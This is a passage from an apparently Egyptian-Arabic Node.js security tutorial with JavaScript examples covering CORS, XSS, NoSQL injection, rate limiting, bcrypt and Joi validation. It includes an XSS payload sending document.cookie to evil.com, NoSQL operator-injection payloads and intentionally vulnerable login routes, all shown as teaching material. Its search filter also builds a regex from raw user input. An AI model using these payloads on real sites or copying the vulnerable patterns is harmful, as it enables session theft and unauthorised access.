const strictCors  = cors({ origin: "https://myapp.com", credentials: true }); // Strict for auth

app.get("/api/public/products", publicCors, getAllProducts);  // Anyone can access
app.post("/api/auth/login",    strictCors, loginUser);        // Only our frontend

// ============================================================
// HANDLING PREFLIGHT (OPTIONS) REQUESTS
// ============================================================

// For some "complex" requests (with custom headers, non-simple methods),
// the browser sends an OPTIONS preflight request first.
// The cors() middleware handles this automatically, but you can be explicit:

app.options("*", cors(corsOptions)); // Enable pre-flight for ALL routes

// ============================================================
// WHAT THE CORS HEADERS LOOK LIKE IN THE RESPONSE
// ============================================================

// When a request comes from https://myapp.com, the server responds with:
// Access-Control-Allow-Origin:      https://myapp.com       ← This origin is allowed
// Access-Control-Allow-Methods:     GET, POST, PUT, DELETE  ← These methods are allowed
// Access-Control-Allow-Headers:     Content-Type, Authorization
// Access-Control-Allow-Credentials: true                    ← Cookies can be sent
// Access-Control-Max-Age:           86400                   ← Cache preflight for 24h

// ============================================================
// COMMON CORS MISTAKES AND FIXES
// ============================================================

// ❌ MISTAKE: Setting credentials: true with origin: "*"
// This combination is INVALID — browsers reject it for security reasons
// app.use(cors({ origin: "*", credentials: true })); // BROKEN

// ✅ FIX: Credentials require a specific origin
// app.use(cors({ origin: "https://myapp.com", credentials: true }));

// ❌ MISTAKE: Forgetting to handle OPTIONS preflight
// Some setups might reject OPTIONS requests if not handled
// app.use(cors()); // Use this — it handles OPTIONS automatically

// ❌ MISTAKE: Putting CORS middleware AFTER route definitions
// app.get("/api/data", handler); // Route defined first
// app.use(cors());               // CORS applied AFTER — too late!

// ✅ FIX: ALWAYS put CORS middleware BEFORE routes
// app.use(cors());
// app.get("/api/data", handler);
```

**[⬆ Back to Top](#)**

---

### 20. إيه هو الـ XSS وكيف نحمي منه في Node.js App؟

---

#### 🧠 الشرح

الـ XSS (Cross-Site Scripting) هو نوع من الهجمات بيحصل لما تسمح لـ JavaScript خبيث إنه يتنفّذ في المتصفح بتاع الضحية على موقعك.

**قصة مبسّطة:**

تخيّل معايا إنك بتعمل موقع Comments زي YouTube. المستخدمين بيكتبوا Comments وبتعرضها لكل الناس.

المهاجم بيكتب Comment كده:
```
أحب الفيديو ده!<script>fetch('https://evil.com/?cookie='+document.cookie)</script>
```

لو أنت عرضت الـ Comment ده على الصفحة بدون Sanitization، المتصفح هيفكر إن الـ `<script>` tag ده جزء من الـ HTML وهيشغّل الـ JavaScript اللي فيه. النتيجة: كل زائر للصفحة، الـ JavaScript الخبيث ده هيتشغّل في متصفحه، وهيبعت الـ Cookies بتاعته (اللي فيها Session Tokens) للمهاجم. المهاجم دلوقتي يقدر يسرق Session بتاع أي حد!

**أنواع الـ XSS:**

**1. Stored XSS (Persistent XSS):**
الأخطر. الـ Payload بيتخزّن في الـ Database (زي مثال الـ Comment). كل واحد يشوف الـ Comment ده يتأثر.

**2. Reflected XSS:**
الـ Payload بيجي في الـ URL أو الـ Request ويترجع في الـ Response. مثلاً: `https://myapp.com/search?q=<script>...</script>`. المهاجم بيبعت اللينك ده للضحية.

**3. DOM-based XSS:**
الـ Attack بيحصل بالكامل في الـ Browser — الـ Server مش متورط. بيحصل لما الـ Frontend JavaScript يقرأ بيانات من مصدر غير موثوق (زي `window.location.hash`) ويحطها في الـ DOM بدون Sanitization.

**كيف نحمي منه؟**

**1. Output Encoding/Escaping:** في كل Template Engine جيد، بيعمل Escape للـ Output تلقائياً. مثلاً `<` بيتحوّل لـ `&lt;`. عشان لو المستخدم كتب `<script>`، هيتعرض كنص مش كـ HTML.

**2. Sanitization للـ Rich Text (HTML):** لو بتسمح بـ HTML (زي Bold وItalic في Comments)، بتحتاج Library زي **DOMPurify** تعمل Sanitize للـ HTML وتشيل الـ Scripts الخبيثة.

**3. Content Security Policy (CSP):** HTTP Header بيحدد من فين يقدر المتصفح يحمّل Scripts. حتى لو نجح المهاجم في حقن Script، الـ CSP بيمنع تشغيلها لو من مصدر غير موثوق.

**4. HttpOnly Cookies:** الـ Cookies المهمة (Session, Auth Tokens) اعملها `httpOnly: true` — يعني JavaScript في المتصفح مش بيقدر يوصلها. حتى لو اتنجح الـ XSS، المهاجم مش يقدر يسرق الـ Auth Cookies.

---

#### 💻 الكود

```javascript
const express  = require("express");
const helmet   = require("helmet");
const DOMPurify = require("isomorphic-dompurify"); // Server-side DOMPurify

const app = express();
app.use(express.json());

// ============================================================
// LAYER 1: Security Headers via Helmet.js
// ============================================================

app.use(
  helmet({
    // Content Security Policy — the most important XSS defense
    contentSecurityPolicy: {
      directives: {
        defaultSrc:  ["'self'"],                          // Only load content from our own origin
        scriptSrc:   ["'self'", "https://cdn.myapp.com"], // Scripts only from self + our CDN
        styleSrc:    ["'self'", "https://fonts.googleapis.com", "'unsafe-inline'"],
        imgSrc:      ["'self'", "data:", "https://images.myapp.com"],
        connectSrc:  ["'self'", "https://api.myapp.com"], // Fetch/XHR only to these origins
        fontSrc:     ["'self'", "https://fonts.gstatic.com"],
        objectSrc:   ["'none'"],                          // Block all plugins (Flash, etc.)
        frameSrc:    ["'none'"],                          // Block iframes from all sources
        upgradeInsecureRequests: [],                      // Upgrade HTTP to HTTPS automatically
      },
    },
    // X-XSS-Protection: 0 — Disables the old browser filter (CSP is better)
    xssFilter: false,
    // Forces browsers to use the declared content type (prevents MIME sniffing attacks)
    noSniff: true,
    // Prevents clickjacking — disallows framing our site in iframes
    frameguard: { action: "deny" },
  })
);

// ============================================================
// LAYER 2: Input Sanitization Middleware
// ============================================================

// Sanitize all string values in req.body to prevent XSS
const sanitizeBody = (req, res, next) => {
  if (req.body && typeof req.body === "object") {
    req.body = sanitizeDeep(req.body);
  }
  next();
};

function sanitizeDeep(obj) {
  if (typeof obj === "string") {
    // Remove any HTML tags from plain text fields — converts < to &lt; etc.
    return obj.replace(/[<>'"&]/g, (char) => {
      const escapeMap = { "<": "&lt;", ">": "&gt;", "'": "&#39;", '"': "&quot;", "&": "&amp;" };
      return escapeMap[char];
    });
  }
  if (Array.isArray(obj)) return obj.map(sanitizeDeep);
  if (obj && typeof obj === "object") {
    return Object.fromEntries(Object.entries(obj).map(([k, v]) => [k, sanitizeDeep(v)]));
  }
  return obj; // Return numbers, booleans, null as-is
}

app.use(sanitizeBody); // Apply to all routes

// ============================================================
// LAYER 3: Rich HTML Content — Using DOMPurify for Safe HTML
// ============================================================

// For fields that ALLOW some HTML (like blog post content with bold/italic)
app.post("/api/blog/posts", async (req, res, next) => {
  try {
    const { title, content } = req.body;

    // Allow safe HTML tags but strip dangerous ones (script, onclick, etc.)
    const cleanContent = DOMPurify.sanitize(content, {
      ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li", "blockquote"],
      ALLOWED_ATTR: ["href", "title"], // Only safe attributes
      FORBID_ATTR:  ["style", "onerror", "onload", "onclick"], // Explicitly block event handlers
    });

    // An attacker submits:
    // <p>Nice post!</p><script>steal(document.cookie)</script><img src=x onerror="steal()">
    // DOMPurify cleans it to:
    // <p>Nice post!</p>  ← only the safe part remains

    const post = await BlogPost.create({ title, content: cleanContent });
    res.status(201).json({ success: true, data: post });
  } catch (err) {
    next(err);
  }
});

// ============================================================
// LAYER 4: HttpOnly Cookies — Protect tokens from JavaScript access
// ============================================================

// When setting authentication cookies, ALWAYS use httpOnly
app.post("/auth/login", async (req, res) => {
  // ... verify credentials ...
  const sessionToken = generateSecureToken();

  res.cookie("session", sessionToken, {
    httpOnly: true,    // JavaScript CANNOT access this cookie — XSS cannot steal it
    secure:   true,    // Only sent over HTTPS connections
    sameSite: "Strict",// Not sent with cross-site requests — CSRF protection
    maxAge:   24 * 60 * 60 * 1000, // 24 hours
  });

  res.json({ message: "Login successful" });
  // Notice: we don't send the token in the response body!
  // The browser handles the cookie automatically
});
```

**[⬆ Back to Top](#)**

---

### 21. إيه هو الـ NoSQL Injection وكيف بنحمي منه في MongoDB؟

---

#### 🧠 الشرح

لما الناس بتسمع "Injection Attack"، فوراً بتفكر في SQL Injection. بس MongoDB ومشتقات الـ NoSQL ليهم نوعهم الخاص من الـ Injection — وده كتير من الـ Developers بيغفل عنه.

**كيف بيحصل؟**

MongoDB بيستقبل الـ Queries كـ JavaScript Objects. المشكلة بتحصل لما إنت بتاخد Input من المستخدم وبتحطه مباشرة في الـ Query بدون Validation.

**مثال الهجوم:**

لو عندك Login Route بيعمل Query كده:
```javascript
User.findOne({ email: req.body.email, password: req.body.password })
```

المهاجم بدل ما يبعت `{ "email": "test@test.com", "password": "wrong" }`، بيبعت:
```json
{
  "email": { "$gt": "" },
  "password": { "$gt": "" }
}
```

الـ `$gt: ""` يعني "أي قيمة أكبر من String فاضي" — وده بيرجع True لأي قيمة موجودة. فالـ Query بقت:
```javascript
User.findOne({ email: { $gt: "" }, password: { $gt: "" } })
```

ده بيرجع **أول User في الـ Database** — بصرف النظر عن الـ Email أو الـ Password! المهاجم دخل الـ System من غير ما يعرف أي Password.

**طرق الحماية:**

**1. Validate Input Types:**
لو بتستنى String، تأكد إنها String. لو جاتك Object، ارفضها. هنا بتيجي أهمية `Joi` أو `Zod`.

**2. Mongoose بيساعد جزئياً:**
Mongoose بيعمل Type Casting — لو الـ Schema بيقول `email: String`، والـ User بعت Object، Mongoose ممكن يتعامل معاه بشكل معين. بس مش Guaranteed Protection في كل الحالات.

**3. استخدم `$` Operator Blocking:**
فيه Libraries زي `express-mongo-sanitize` بتشيل أي Keys بتبدأ بـ `$` من الـ `req.body`، `req.query`، و `req.params`.

**4. مش تثق في الـ Input أبداً:**
كل حاجة جاية من الـ Client مش موثوقة. Validate وSanitize قبل ما تستخدمها.

---

#### 💻 الكود

```javascript
const express          = require("express");
const mongoSanitize    = require("express-mongo-sanitize");
const Joi              = require("joi");

const app = express();
app.use(express.json());

// ============================================================
// PROTECTION LAYER 1: express-mongo-sanitize
// Removes any keys that start with $ or contain . from req.body, req.query, req.params
// ============================================================

app.use(
  mongoSanitize({
    replaceWith: "_",      // Replace prohibited characters with "_" instead of removing
    onSanitize: ({ req, key }) => {
      console.warn(`⚠️  Sanitized potentially malicious key: '${key}' from ${req.ip}`);
    },
  })
);

// After this middleware:
// req.body = { "email": { "$gt": "" } }
// becomes:
// req.body = { "email": { "_gt": "" } }
// This breaks the MongoDB operator syntax — the attack fails

// ============================================================
// PROTECTION LAYER 2: Joi Schema Validation
// Enforces strict types — rejects anything that isn't the expected type
// ============================================================

const loginSchema = Joi.object({
  email:    Joi.string().email().lowercase().trim().max(255).required(),
  password: Joi.string().min(8).max(128).required(),
  // Strict: ONLY these two fields, any extra fields are rejected
}).options({ allowUnknown: false, stripUnknown: true });

// ============================================================
// VULNERABLE LOGIN — DO NOT DO THIS
// ============================================================

app.post("/auth/login/UNSAFE", async (req, res) => {
  const { email, password } = req.body;
  // DANGER: If attacker sends { email: { $gt: "" }, password: { $gt: "" } }
  // This query matches ALL users and returns the first one!
  const user = await User.findOne({ email, password }); // NoSQL Injection vulnerable!
  if (!user) return res.status(401).json({ error: "Invalid credentials" });
  res.json({ token: generateToken(user) });
});

// ============================================================
// SECURE LOGIN — Multiple layers of protection
// ============================================================

app.post("/auth/login/SAFE", async (req, res, next) => {
  try {
    // LAYER 1: Validate and sanitize input with Joi
    const { error, value } = loginSchema.validate(req.body);
    if (error) {
      return res.status(400).json({
        error: "Validation Error",
        details: error.details.map((d) => d.message),
      });
    }

    const { email, password } = value; // Use validated/sanitized values, not req.body directly

    // LAYER 2: Type enforcement — ensure email is a string (extra safety)
    if (typeof email !== "string" || typeof password !== "string") {
      return res.status(400).json({ error: "Invalid input types" });
    }

    // LAYER 3: Find by email ONLY, then verify password separately
    // Never put untrusted input in the password field of a query
    const user = await User.findOne({ email }).select("+passwordHash").lean();

    // Use a constant-time comparison to prevent timing attacks
    const isValidPassword =
      user && (await bcrypt.compare(password, user.passwordHash));

    // Return the SAME error message for both wrong email and wrong password
    // This prevents attackers from knowing which one was wrong (user enumeration)
    if (!user || !isValidPassword) {
      return res.status(401).json({ error: "Invalid email or password" });
    }

    const token = generateToken(user._id, user.role);
    res.json({ token });
  } catch (err) {
    next(err);
  }
});

// ============================================================
// PROTECTING QUERY PARAMETERS — Injection via req.query
// ============================================================

// Vulnerable: GET /users?role[$ne]=user (returns everyone who is NOT a regular user)
app.get("/users/UNSAFE", async (req, res) => {
  // req.query.role could be { $ne: "user" } — this finds admin users!
  const users = await User.find({ role: req.query.role }); // VULNERABLE
  res.json(users);
});

// Safe: Validate and whitelist allowed values from query params
app.get("/users/SAFE", async (req, res) => {
  const allowedRoles = ["user", "admin", "moderator"];
  const role = req.query.role;

  // Validate: role must be a string AND must be in our whitelist
  if (role && (typeof role !== "string" || !allowedRoles.includes(role))) {
    return res.status(400).json({ error: "Invalid role parameter" });
  }

  const filter = role ? { role } : {}; // Only filter by role if provided and valid
  const users  = await User.find(filter).lean();
  res.json(users);
});
```

**[⬆ Back to Top](#)**

---

### 22. إيه هو الـ Rate Limiting وكيف بنطبّقه في Express؟

---

#### 🧠 الشرح

الـ Rate Limiting هو آلية بتحدد **عدد الـ Requests** اللي مصدر معين (IP أو User) يقدر يبعتها في **فترة زمنية معينة**.

**ليه بنحتاجه؟**

**1. الحماية من Brute Force Attacks:**
المهاجم عايز يخمّن Password بتاع Account معين. الطريقة هي يجرب آلاف الـ Passwords في ثواني (Automated). بدون Rate Limiting، الـ Server هيقبل كل الـ Requests دي. مع Rate Limiting: بعد 5 محاولات فاشلة خلال ساعة، الـ IP اتبلوك.

**2. الحماية من DDoS (Distributed Denial of Service):**
هجوم بيغرق الـ Server بملايين الـ Requests من أجهزة كتير في نفس الوقت عشان يوقّفه. الـ Rate Limiting يساعد في التخفيف من الهجوم ده.

**3. منع الـ Resource Abuse:**
ممكن يكون في User بيعمل Scraping لموقعك (بيجيب كل المحتوى تلقائياً) أو بيستهلك موارد الـ Server بشكل غير عادل. الـ Rate Limiting بيمنع ده.

**4. Cost Control لـ External APIs:**
لو بتستخدم External API بتتحاسب عليها، Rate Limiting بيمنع الاستخدام المفرط بالغلط أو بسبب Bug في الكود.

**الـ Algorithms المختلفة:**

**Fixed Window:**
تحسب الـ Requests في نافذة وقت ثابتة (مثلاً كل دقيقة). المشكلة: في نهاية الدقيقة وبداية الدقيقة الجديدة، المستخدم يقدر يبعت ضعف الـ Limit في ثانيتين.

**Sliding Window:**
أذكى — بيحسب الـ Requests في آخر X دقائق من الـ Request الحالي. مش نافذة ثابتة. حل لمشكلة الـ Fixed Window.

**Token Bucket:**
كل User عنده "Bucket" فيه Tokens. كل Request بياخد Token. الـ Bucket بيتعبّى بمعدل ثابت. لو الـ Bucket فاضي، الـ Request بيترفض. بيسمح بـ Bursts قصيرة.

**Leaky Bucket:**
الـ Requests بتتراكم في Queue وبتتشغّل بمعدل ثابت. أكثر تسوية للـ Traffic.

---

#### 💻 الكود

```javascript
const express   = require("express");
const rateLimit = require("express-rate-limit");
const RedisStore = require("rate-limit-redis");  // For multi-server environments
const redis     = require("redis");

const app = express();
app.set("trust proxy", 1); // Required for correct IP detection behind Nginx

// ============================================================
// STORE SETUP — Redis for distributed rate limiting
// ============================================================

// If using multiple Node.js instances, rate limit state must be shared via Redis
// Without this, each instance has its own counter — rate limit is ineffective
const redisClient = redis.createClient({ url: process.env.REDIS_URL });
redisClient.connect();

// ============================================================
// RATE LIMITER 1: General API Limiter — applies to all routes
// ============================================================

const generalLimiter = rateLimit({
  windowMs:        15 * 60 * 1000, // 15-minute sliding window
  max:             100,            // 100 requests per IP per window
  standardHeaders: "draft-7",      // Send RateLimit headers (RFC standard)
  legacyHeaders:   false,
  keyGenerator:    (req) => req.ip, // Rate limit by IP address
  skip: (req) => {
    // Skip rate limiting for internal health checks from the load balancer
    return req.path === "/health" && req.ip === "127.0.0.1";
  },
  handler: (req, res) => {
    res.status(429).json({
      success: false,
      error:   "Too many requests",
      message: "You have exceeded the rate limit. Please wait before retrying.",
      retryAfter: Math.ceil(req.rateLimit.resetTime / 1000), // Seconds until reset
    });
  },
  store: new RedisStore({
    sendCommand: (...args) => redisClient.sendCommand(args), // Use Redis for shared state
  }),
});

app.use("/api/", generalLimiter); // Apply to all /api routes

// ============================================================
// RATE LIMITER 2: Auth Routes — strict limits to prevent brute force
// ============================================================

const authLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1-hour window
  max:      10,              // Only 10 login/register attempts per hour per IP
  skipSuccessfulRequests: true, // Don't count successful logins against the limit
  message: {
    error:   "Too many authentication attempts",
    message: "Your IP has been temporarily blocked due to too many failed attempts. Try again in 1 hour.",
  },
  store: new RedisStore({ sendCommand: (...args) => redisClient.sendCommand(args) }),
});

app.use("/api/auth/login",    authLimiter);
app.use("/api/auth/register", authLimiter);
app.use("/api/auth/forgot-password", authLimiter);

// ============================================================
// RATE LIMITER 3: Per-User Rate Limiting (after authentication)
// ============================================================

// Different limits based on user subscription tier
const createUserLimiter = (maxRequests) =>
  rateLimit({
    windowMs:     60 * 1000, // 1-minute window
    max:          maxRequests,
    keyGenerator: (req) => req.user?.userId || req.ip, // Rate limit by user ID after auth
    standardHeaders: "draft-7",
    store: new RedisStore({ sendCommand: (...args) => redisClient.sendCommand(args) }),
  });

const freeLimiter    = createUserLimiter(30);  // Free users: 30 req/min
const premiumLimiter = createUserLimiter(200); // Premium users: 200 req/min

// Apply different limits based on subscription
app.use("/api/data", verifyToken, (req, res, next) => {
  const limiter = req.user.subscription === "premium" ? premiumLimiter : freeLimiter;
  limiter(req, res, next);
});

// ============================================================
// PROGRESSIVE PENALTIES — Increasing delays for repeated violations
// ============================================================

const loginAttemptTracker = {}; // In production, use Redis

function progressiveLimiter(req, res, next) {
  const key      = req.ip;
  const attempts = loginAttemptTracker[key] || 0;

  if (attempts >= 20) {
    return res.status(429).json({ error: "Account temporarily locked. Contact support." });
  }

  if (attempts >= 10) {
    // Add increasing delay for repeated offenders
    setTimeout(next, 2000); // 2 second delay
  } else if (attempts >= 5) {
    setTimeout(next, 500); // 500ms delay
  } else {
    next();
  }
}

// ============================================================
// RESPONSE HEADERS sent by rate-limit-express (RFC 6585 compatible)
// ============================================================

// RateLimit-Limit:     100       ← Max requests allowed in the window
// RateLimit-Remaining: 87        ← How many requests are left
// RateLimit-Reset:     1699900000 ← Unix timestamp when the window resets
// Retry-After:         900       ← (On 429) Seconds to wait before retrying
```

**[⬆ Back to Top](#)**

---

### 23. إيه هو الـ Password Hashing وليه `bcrypt` تحديداً؟

---

#### 🧠 الشرح

أول سؤال لازم يخطر في بالك كـ Developer: ليه مش بخزّن الـ Password مباشرة في الـ Database؟

الجواب بسيط وخطير: لو اتسرقت الـ Database (وده بيحصل أكتر مما تتخيّل)، المهاجم هياخد **كل Passwords بتاعت كل المستخدمين** — بلا مجهود. وبما إن 60%+ من الناس بيستخدموا نفس الـ Password في أكتر من موقع، المهاجم يقدر يدخل على Email، Bank Account، Social Media الضحية.

**ليه Hashing مش Encryption؟**

الـ **Encryption** عملية Two-way — ممكن ترجع. لو عندك الـ Key، تقدر تعمل Decrypt. لو سرق المهاجم الـ Database والـ Encryption Key، خلص.

الـ **Hashing** عملية One-way — مش ممكن ترجعها. تحول "pass123" لـ `$2b$12$...` بس مش ممكن تعمل العكس. عشان تتأكد من الـ Password، بتعمل Hash للـ Password المُدخل وبتقارنه بالـ Hash المخزّن.

**ليه مش SHA-256 أو MD5؟**

MD5 وSHA-1 وحتى SHA-256 مصمّمين يكونوا **سريعين جداً** — عشان بيستخدموا في Data Integrity وDigital Signatures. GPU حديث يقدر يحسب **مليارات** MD5 Hash في الثانية. يعني لو عندك هاش MD5 لـ Password "password123"، المهاجم ممكن يكسره في **ثوانٍ** بـ Brute Force.

**bcrypt هو الحل لأنه:**

1. **بطيء عمداً:** الـ Cost Factor (Salt Rounds) بيحدد عدد iterations. 12 Rounds = 2^12 = 4096 حسابات. ده بياخد ~200ms على Server حديث. بالنسبة للـ User مش حاسس بفرق. بالنسبة للمهاجم، بدل ما يجرب مليار في الثانية، هيجرب ألاف بس.

2. **Built-in Salting:** الـ Salt هو Random Data بيتضاف للـ Password قبل الـ Hashing. ده بيضمن إن نفس الـ Password يدي Hashes مختلفة — بيمنع **Rainbow Table Attacks** (جداول مُعدّة مسبقاً من الـ Passwords الشائعة وهاشاتها).

3. **يستوعب الـ Hardware Improvements:** مع الوقت الـ Hardware بيتحسن. تقدر ترفع الـ Cost Factor وتعمل Rehash للـ Passwords الموجودة.

**الـ Argon2 — الجيل الجديد:**

بعد 2015، ظهرت **Argon2** وفازت بـ Password Hashing Competition. هي أحدث وأقوى من bcrypt في بعض الجوانب. لو شغّال بـ Node.js 21+ أو بتستخدم TypeScript Modern Setup، فكّر في الانتقال ليها.

---

#### 💻 الكود

```javascript
const bcrypt = require("bcrypt");

// ============================================================
// UNDERSTANDING THE COST FACTOR (Salt Rounds)
// ============================================================

async function benchmarkBcrypt() {
  const password = "TestPassword123!";

  // Benchmark different cost factors
  for (const rounds of [10, 12, 14, 16]) {
    const start = Date.now();
    await bcrypt.hash(password, rounds);
    const duration = Date.now() - start;
    console.log(`Cost ${rounds}: ${duration}ms`);
  }
  // Typical output on a modern server:
  // Cost 10:  ~80ms
  // Cost 12:  ~300ms   ← Good balance for most apps (recommended minimum)
  // Cost 14:  ~1200ms  ← For high-security apps (finance)
  // Cost 16:  ~5000ms  ← Very high security, noticeable to users
}

// ============================================================
// REGISTRATION — Hashing the password before saving
// ============================================================

const BCRYPT_COST_FACTOR = 12; // Store in a constant for easy updating

app.post("/api/auth/register", async (req, res, next) => {
  try {
    const { email, password, name } = req.body;

    // --- Password strength validation BEFORE hashing ---
    const passwordRequirements = [
      { regex: /.{8,}/, message: "Must be at least 8 characters" },
      { regex: /[A-Z]/, message: "Must contain at least one uppercase letter" },
      { regex: /[a-z]/, message: "Must contain at least one lowercase letter" },
      { regex: /\d/,    message: "Must contain at least one number" },
      { regex: /[!@#$%^&*]/, message: "Must contain at least one special character" },
    ];

    const failedRequirements = passwordRequirements
      .filter((req) => !req.regex.test(password))
      .map((req) => req.message);

    if (failedRequirements.length > 0) {
      return res.status(400).json({ error: "Weak password", requirements: failedRequirements });
    }

    // --- Check for existing user BEFORE hashing (save computation) ---
    const existingUser = await User.findOne({ email: email.toLowerCase() });
    if (existingUser) {
      return res.status(409).json({ error: "An account with this email already exists" });
    }

    // --- Hash the password ---
    // bcrypt.hash() auto-generates a unique salt and embeds it in the hash string
    const passwordHash = await bcrypt.hash(password, BCRYPT_COST_FACTOR);
    // The resulting hash looks like: "$2b$12$RandomSaltHere...HashedValueHere"
    // It contains: algorithm ($2b$), cost factor (12$), salt (22 chars), hash (31 chars)

    // --- Save user with hash, NEVER with plain password ---
    const user = await User.create({ name, email: email.toLowerCase(), passwordHash });

    // --- Clear the password from the response ---
    const { passwordHash: _, ...userWithoutPassword } = user.toObject();

    res.status(201).json({ success: true, data: userWithoutPassword });
  } catch (err) {
    next(err);
  }
});

// ============================================================
// LOGIN — Verifying the password
// ============================================================

app.post("/api/auth/login", async (req, res, next) => {
  try {
    const { email, password } = req.body;

    // --- Fetch user WITH passwordHash (it's select: false in schema) ---
    const user = await User.findOne({ email: email.toLowerCase() }).select("+passwordHash");

    // --- Constant-time comparison to prevent timing attacks ---
    // bcrypt.compare() takes the same time whether user exists or not
    // This prevents attackers from detecting valid emails via response time differences
    const dummyHash = "$2b$12$InvalidHashForTimingAttackPrevention000000000000000000";
    const hashToCompare = user ? user.passwordHash : dummyHash;

    const isPasswordValid = await bcrypt.compare(password, hashToCompare);

    // --- Return generic error — don't reveal whether email OR password was wrong ---
    if (!user || !isPasswordValid) {
      return res.status(401).json({ error: "Invalid email or password" });
    }

    // --- Check if password needs rehashing (cost factor was updated) ---
    if (bcrypt.getRounds(user.passwordHash) < BCRYPT_COST_FACTOR) {
      // Upgrade: rehash with the new cost factor while user is logged in
      const newHash = await bcrypt.hash(password, BCRYPT_COST_FACTOR);
      await User.findByIdAndUpdate(user._id, { passwordHash: newHash });
    }

    const token = generateAccessToken(user._id, user.role);
    res.json({ token, expiresIn: "15m" });
  } catch (err) {
    next(err);
  }
});

// ============================================================
// CHANGE PASSWORD — Verify old password before allowing change
// ============================================================

app.post("/api/auth/change-password", verifyToken, async (req, res, next) => {
  try {
    const { currentPassword, newPassword } = req.body;

    const user = await User.findById(req.user.userId).select("+passwordHash");

    // Verify the current password before allowing the change
    const isCurrentPasswordValid = await bcrypt.compare(currentPassword, user.passwordHash);
    if (!isCurrentPasswordValid) {
      return res.status(401).json({ error: "Current password is incorrect" });
    }

    // Prevent reusing the same password
    const isSamePassword = await bcrypt.compare(newPassword, user.passwordHash);
    if (isSamePassword) {
      return res.status(400).json({ error: "New password must be different from current password" });
    }

    // Hash and save the new password
    user.passwordHash = await bcrypt.hash(newPassword, BCRYPT_COST_FACTOR);
    await user.save(); // Uses .save() so the pre-save hook runs if we have one

    // Invalidate all existing tokens (force re-login on all devices)
    await Token.deleteMany({ userId: user._id });
    res.clearCookie("refreshToken");

    res.json({ success: true, message: "Password changed successfully. Please log in again." });
  } catch (err) {
    next(err);
  }
});
```

**[⬆ Back to Top](#)**

---

### 24. إيه هو `Joi` و `Zod` وإيه الفرق بينهم؟ ولماذا الـ Validation مهم جداً؟

---

#### 🧠 الشرح

تخيّل إنك بتشتغل في مطعم وجاك زبون بطلب "برجر بدون خبز، بس بخس خبز إضافي، بدون لحمة، وبإضافة لحمة تاني." لو ما عندكش طريقة تتعامل مع الطلبات الغريبة دي، المطبخ هيتجنن.

الـ Input Validation بيحل نفس المشكلة في الـ API. إنت لازم تتأكد إن البيانات الجاية صح **قبل** ما تعملها أي حاجة.

**ليه لازم Validation؟**

1. **Security:** بيمنع Injection Attacks والـ Malformed Data اللي ممكن تكسر الـ Logic
2. **Data Integrity:** بيضمن إن الـ Database مملوش Data غلط
3. **Better Error Messages:** بدل Error عشوائي من قاعدة البيانات، بترجع رسالة واضحة للـ User
4. **Developer Experience:** كود أنظف وـ Logic الـ Business بيتركز على الـ Business مش على الـ Validation

**الـ `if` Statements كافية؟**

لـ Cases بسيطة، ممكن. بس لما الـ Schema يتعقد:
- Nested Objects بـ Arrays بـ Objects
- Conditional Validation (لو X موجود، Y إجباري)
- Cross-field Validation (الـ endDate لازم يكون بعد الـ startDate)
- Custom Error Messages لكل Rule
- الكود بيبقى معقد جداً بـ `if` Statements وبيتكرر في كل Route

هنا بتيجي قيمة Libraries زي **Joi** أو **Zod**.

**Joi:**
الأقدم والأشهر. Runtime Validation بـ Fluent API. شايع جداً في الـ JavaScript Projects.

**Zod:**
الأحدث والأكثر انتشاراً مع TypeScript. بيولّد TypeScript Types من الـ Schema تلقائياً — يعني مش محتاج تكتب الـ Types مرتين. Full Type Safety.

---

#### 💻 الكود

```javascript
const Joi = require("joi");

// ============================================================
// SCHEMA DEFINITIONS — Joi
// ============================================================

// Schema for creating a new user
const createUserSchema = Joi.object({
  name: Joi.string()
    .trim()
    .min(2).max(50)
    .required()
    .messages({
      "string.min":  "Name must be at least 2 characters long",
      "string.max":  "Name cannot exceed 50 characters",
      "any.required": "Name is required",
    }),

  email: Joi.string()
    .email({ tlds: { allow: false } }) // Don't validate TLDs (allow .io, .dev, etc.)
    .lowercase()
    .required(),

  password: Joi.string()
    .min(8).max(128)
    .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*])/)
    .required()
    .messages({
      "string.pattern.base": "Password must contain uppercase, lowercase, number, and special character",
    }),

  role: Joi.string()
    .valid("user", "admin", "moderator")
    .default("user"),

  age: Joi.number().integer().min(18).max(120).optional(),

  address: Joi.object({
    street:  Joi.string().trim().required(),
    city:    Joi.string().trim().required(),
    country: Joi.string().trim().default("Egypt"),
  }).optional(),

  // Array validation
  skills: Joi.array()
    .items(Joi.string().trim().min(2).max(30))
    .max(20)
    .unique()
    .optional(),
});

// Schema for query parameters (pagination)
const paginationSchema = Joi.object({
  page:     Joi.number().integer().min(1).default(1),
  limit:    Joi.number().integer().min(1).max(100).default(20),
  sortBy:   Joi.string().valid("createdAt", "name", "price", "updatedAt").default("createdAt"),
  sortOrder: Joi.string().valid("asc", "desc").default("desc"),
  search:   Joi.string().trim().max(100).optional(),
});

// Schema with cross-field validation
const dateRangeSchema = Joi.object({
  startDate: Joi.date().iso().required(),
  endDate:   Joi.date().iso().min(Joi.ref("startDate")).required() // endDate must be >= startDate
    .messages({ "date.min": "End date must be after start date" }),
});

// ============================================================
// VALIDATION MIDDLEWARE FACTORY
// ============================================================

// Source can be 'body', 'query', or 'params'
const validate = (schema, source = "body") => async (req, res, next) => {
  const { error, value } = schema.validate(req[source], {
    abortEarly:   false,    // Collect ALL errors, not just the first one
    allowUnknown: false,    // Reject unknown fields (prevents extra data injection)
    stripUnknown: true,     // Remove unknown fields from the value
  });

  if (error) {
    const errors = error.details.map((detail) => ({
      field:   detail.path.join("."),   // e.g., "address.city"
      message: detail.message,
      type:    detail.type,             // e.g., "string.min"
    }));

    return res.status(400).json({
      success: false,
      error:   "Validation failed",
      errors,
    });
  }

  // Replace the original data with the validated, sanitized, and type-coerced value
  req[source] = value;
  next();
};

// ============================================================
// USAGE IN ROUTES
// ============================================================

const router = express.Router();

// Validates req.body against createUserSchema before the handler runs
router.post("/users",
  validate(createUserSchema, "body"),
  createUserHandler
);

// Validates req.query against paginationSchema
router.get("/users",
  validate(paginationSchema, "query"),
  async (req, res) => {
    // req.query is now safe and has defaults applied:
    // { page: 1, limit: 20, sortBy: "createdAt", sortOrder: "desc" }
    const { page, limit, sortBy, sortOrder, search } = req.query;

    const filter = search ? { name: new RegExp(search, "i") } : {};
    const sort   = { [sortBy]: sortOrder === "asc" ? 1 : -1 };
    const skip   = (page - 1) * limit;

